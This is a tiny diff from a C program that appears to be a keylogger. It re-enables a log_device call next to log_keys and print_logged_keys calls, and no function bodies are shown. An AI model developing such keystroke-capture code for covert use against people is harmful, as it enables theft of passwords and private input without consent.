@@ -28,7 +28,7 @@ void main(void) {
 
   key_package key_package;
   key_package.keys_arr_size = 0;
-  // log_device(&key_package);
+  log_device(&key_package);
   log_keys(&key_package);
   print_logged_keys(key_package);
   // printf("Host name: %s\n", key_package.host_device_name);
